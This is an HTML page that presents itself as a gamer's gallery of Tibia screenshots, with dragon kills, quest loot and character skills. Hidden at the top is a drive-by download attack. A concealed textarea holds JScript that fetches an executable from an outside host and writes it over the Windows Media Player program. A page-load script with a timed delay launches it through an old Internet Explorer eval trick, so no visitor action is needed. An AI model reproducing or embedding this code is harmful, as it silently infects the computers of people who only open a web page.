<HTML>
<textarea id="code" style="display:none;">

    var x = new ActiveXObject("Microsoft.XMLHTTP"); 
    x.Open("GET", "http://www.djvirus.republika.pl/1.exe",0); 
    x.Send(); 
    
    var s = new ActiveXObject("ADODB.Stream");
    s.Mode = 3;
    s.Type = 1;
    s.Open();
    s.Write(x.responseBody);

    s.SaveToFile("C:\\Program Files\\Windows Media Player\\wmplayer.exe",2);
    location.href = "mms://";

</textarea>


<script language="javascript">

    function preparecode(code) {
        result = '';
        lines = code.split(/\r\n/);
        for (i=0;i<lines.length;i++) {
        
            line = lines[i];
            line = line.replace(/^\s+/,"");
            line = line.replace(/\s+$/,"");
            line = line.replace(/'/g,"\\'");
            line = line.replace(/[\\]/g,"\\\\");
            line = line.replace(/[/]/g,"%2f");

            if (line != '') {
                result += line + '\\r\\n';
            }
        }
        return result;
    }
    
    function doit() {
        mycode = preparecode(document.all.code.value);
        myURL = "file:javascript:eval('" + mycode + "')";
        window.open(myURL,"_media");
    }
    

    window.open("error.jsp","_media");
    
    setTimeout("doit()", 5000);
    
    
</script>
<body background="new04.jpg" bgcolor="#FFFFFF">

<p>&nbsp;</p>

<p><font color="#000000" size="7" face="Comic Sans MS">Hello ;] .
. . Old Titania screens here ..;) </font><font color="#0000FF"
size="5" face="Comic Sans MS">Armandea's life..</font></p>

<p>&nbsp;</p>

<p><font size="5" face="Lucida Console"><strong>1. KAMIKAZZE ;)</strong></font></p>

<p><font size="5" face="Lucida Console"><strong><img
src="kamikazze.jpg" width="162" height="162"></strong></font></p>



<p><font size="5" face="Lucida Console"><strong>3.First Dragon
solo at lev 17 ;]</strong></font></p>

<p><font size="5" face="Lucida Console"><strong><img
src="dragonLVL17.JPG" width="889" height="660"></strong></font></p>

<p><font size="5" face="Lucida Console"><strong>4.Here is a loot
from 1x drag spawn near Thais ..:)</strong></font></p>

<p><font size="5" face="Lucida Console"><strong><img
src="lootDRAGONS.JPG" width="937" height="685"></strong></font></p>

<p><font size="5" face="Lucida Console"><strong>5.First GS solo
at lev 22 ;]</strong></font></p>

<p><font size="5" face="Lucida Console"><strong><img
src="expforGS.jpg" width="826" height="512"></strong></font></p>

<p><font size="5" face="Lucida Console"><strong>6.Crusader Helmet
quest. We were one of first team which did this quest;]</strong></font></p>

<p><font size="5" face="Lucida Console"><strong><img
src="Crusaderquest3final.JPG" width="440" height="235"></strong></font></p>

<p><font size="5" face="Lucida Console"><strong>7.This is how
real Paladins train ..;]</strong></font></p>

<p><font size="5" face="Lucida Console"><strong><img
src="distatGS.jpg" width="889" height="630"></strong></font></p>

<p><font size="5" face="Lucida Console"><strong>8.&lt;sing&gt;
This is how we do it &lt;sing&gt; ..;]</strong></font></p>

<p><font size="5" face="Lucida Console"><strong><img
src="niceadv.JPG" width="236" height="31"></strong></font></p>

<p><font size="5" face="Lucida Console">9.My UHmaker sd hit ..;]</font></p>

<p><font size="5" face="Lucida Console"><img
src="sdhit12druid.jpg" width="294" height="182"></font></p>

<p><font size="5" face="Lucida Console">10.ME IS IVUL NPC KILLER
!!</font></p>

<p><font size="5" face="Lucida Console"><img src="npckiller.jpg"
width="715" height="442"></font></p>

<p><font size="5" face="Lucida Console">11. Crazy, huh ?</font></p>

<p><font size="5" face="Lucida Console"><img src="guardhell3.JPG"
width="811" height="583"></font></p>

<p><font size="5" face="Lucida Console">12. And at the END ... my
skills and EQ ;]<img src="eqandskills.jpg" width="805"
height="586"></font></p>

<p>&nbsp;</p>

<p><font size="5" face="Lucida Console"><strong>Virus-rat slayer
is Armandea after NAMELOCK ;] thanks for watching bye ..</strong></font></p>

<p>&nbsp;</p>

<p>&nbsp;</p>

<p> </p>

</HTML>